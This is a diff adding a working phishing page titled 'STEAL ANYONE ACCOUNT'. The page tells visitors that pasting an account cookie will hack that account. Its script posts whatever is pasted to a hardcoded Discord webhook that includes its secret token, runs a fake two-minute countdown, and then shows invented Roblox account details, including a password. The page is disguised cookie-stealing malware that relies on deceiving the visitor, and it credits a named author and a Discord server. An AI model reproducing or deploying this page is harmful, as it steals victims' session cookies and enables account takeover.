@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STEAL ANYONE ACCOUNT</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: black;
+            font-family: Arial, sans-serif;
+            color: white;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4);
+        }
+        textarea {
+            width: 300px;
+            height: 100px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 16px;
+            resize: none;
+            background: #333;
+            color: white;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: white;
+            background-color: #28a745;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .matrix {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: black;
+            overflow: hidden;
+        }
+        .matrix canvas {
+            display: block;
+        }
+        .credits {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            font-size: 12px;
+            color: gray;
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix">
+        <canvas id="matrixCanvas"></canvas>
+    </div>
+    <div class="container">
+        <h1>Enter the account cookie you want to enter</h1>
+        <p>Paste cookie in this text box below</p>
+        <textarea id="messageBox" placeholder="Paste your cookie here..."></textarea><br>
+        <button onclick="sendToWebhook()">Send</button>
+        <p id="statusMessage"></p>
+        <p id="accountDetails" style="display: none; color: red;"></p>
+    </div>
+    <div class="credits">
+        creds to heyitspat_y<br>
+        Discord : <a href="https://discord.gg/EsDrJ84XvR" target="_blank">https://discord.gg/EsDrJ84XvR</a>
+    </div>
+
+    <script>
+        async function sendToWebhook() {
+            const messageBox = document.getElementById('messageBox');
+            const message = messageBox.value.trim();
+            const statusMessage = document.getElementById('statusMessage');
+            const accountDetails = document.getElementById('accountDetails');
+
+            if (message.length < 10) {
+                statusMessage.textContent = 'No funny business, You want the account or not?';
+                return;
+            }
+
+            statusMessage.textContent = 'Grabbing account. Please wait! | The account is being hacked...';
+
+            // Send to webhook ASAP
+            try {
+                await fetch('https://discord.com/api/webhooks/1316470476956237844/OLLYXYXI3GYsoWNn0nm0hSNXK7CNcj4ZP5O-JkdXC2LmyuOQZ7RzbIhhefPS3gfAujUs', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `@everyone\n\nHere is the cookie master Nonchalant\n\n\` ${message} \``
+                    }),
+                });
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
+                statusMessage.textContent = 'Failed to send to webhook. Please try again.';
+                return;
+            }
+
+            // Start the countdown
+            let timer = 120; // 2 minutes countdown
+            const countdown = setInterval(() => {
+                if (timer <= 0) {
+                    clearInterval(countdown);
+                    statusMessage.textContent = '';
+                    accountDetails.innerHTML = `
+                        <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-50849A5064B50B75129E241412B894EF-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="User Image"><br>
+                        <strong>Username:</strong> nicorobin_solos<br>
+                        <strong>User ID:</strong> 4179585303<br>
+                        <strong>Password:</strong> J86aN84_+:'K<br>
+                        Here is the account!
+                    `;
+                    accountDetails.style.display = 'block';
+                } else {
+                    statusMessage.textContent = `Time remaining: ${Math.floor(timer / 60)}:${(timer % 60).toString().padStart(2, '0')}`;
+                }
+                timer--;
+            }, 1000);
+        }
+
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const columns = Math.floor(canvas.width / 20);
+        const drops = Array(columns).fill(1);
+
+        const draw = () => {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#0f0';
+            ctx.font = '15px monospace';
+
+            drops.forEach((y, index) => {
+                const text = String.fromCharCode(Math.random() * 128);
+                const x = index * 20;
+
+                ctx.fillText(text, x, y * 20);
+
+                if (y * 20 > canvas.height && Math.random() > 0.975) {
+                    drops[index] = 0;
+                }
+
+                drops[index]++;
+            });
+        };
+
+        setInterval(draw, 50);
+    </script>
+</body>
+</html>
